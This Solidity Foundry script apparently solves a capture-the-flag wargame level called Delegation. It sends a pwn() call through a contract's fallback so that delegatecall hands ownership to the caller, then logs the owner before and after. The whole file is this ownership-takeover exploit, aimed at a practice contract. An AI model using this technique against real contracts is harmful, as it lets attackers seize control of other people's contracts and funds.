// SPDX-License-Identifier: MIT
// forge script script/Level06DelegationSolution.s.sol -vvvv --broadcast
pragma solidity ^0.8.0;

import "../src/Level06Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level06DelegationSolution is Script {
    Delegate delegateInstance = Delegate(0x079Ba6D8d837AaC233b6BC3659f1691C19587F9C);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Befor owner: ", delegateInstance.owner());
        (bool success, ) = address(delegateInstance).call(abi.encodeWithSignature("pwn()")); // msg.data 전달
        require(success, "Delegate call to pwn() failed");

        console.log("After owner: ", delegateInstance.owner());
        console.log("My address: ", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}